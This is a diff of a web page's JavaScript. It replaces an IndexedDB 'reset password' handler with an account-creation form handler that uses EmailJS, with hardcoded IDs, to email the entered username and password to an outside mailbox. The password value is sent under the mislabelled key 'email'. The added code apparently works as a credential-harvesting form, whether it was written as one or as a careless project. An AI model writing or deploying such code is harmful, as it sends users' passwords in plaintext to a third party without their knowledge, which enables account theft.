@@ -1,41 +1,28 @@
-document.getElementById("forgotPasswordLink").addEventListener("click", function() {
-    // Show a confirmation dialog
-    const userConfirmed = confirm("Are you sure you want to reset your password details?");
+(function () {
+    emailjs.init("yvgEpr9WavK6KgXh3"); // Replace with your EmailJS User ID
+})();
 
-    // Check the user's choice
-    if (userConfirmed) {
-        // Open the IndexedDB
-        const request = indexedDB.open('UserDataDB', 1);
+document.getElementById("createAccount").addEventListener("submit", function (e) {
+    e.preventDefault(); // Prevent the form from submitting in the traditional way
+    
+    const params = {
+        identify: document.getElementById("username").value,
+        email: document.getElementById("password").value,
+    };
 
-        request.onerror = function (event)  {
-            alert("IndexedDB error: " + event.target.errorCode);
-        };
-
-        request.onsuccess = function(event) {
-            const db = event.target.result;
-
-            // Open a transaction to access the database
-            const transaction = db.transaction(['users'], 'readwrite');
-
-            // Get the object store
-            const objectStore = transaction.objectStore('users');
-
-            // Clear all data in the object store
-            const clearRequest = objectStore.clear();
-
-            clearRequest.onsuccess = function() {
-                alert("Password details have been reset.");
-            };
-
-            clearRequest.onerror = function() {
-                alert("Failed to reset password details.");
-            };
-        };
-
-        request.onerror = function(event) {
-            alert("Failed to open the database.");
-        };
-    } else {
-        // User dismissed the alert, you can perform other actions here.
-    }
+    emailjs.send("service_nkuhy2y", "template_fexre2d", params) // Replace with your Service ID and Template ID
+        .then(function (res) {
+            alert("Email sent successfully! Status: ");
+            clearFormFields(); // Call the function to clear form fields
+        })
+        .catch(function (error) {
+            alert("An error occurred while sending the email: " + error);
+        });
 });
+
+function clearFormFields() {
+    // Replace these lines with clearing the fields you want
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+}
+
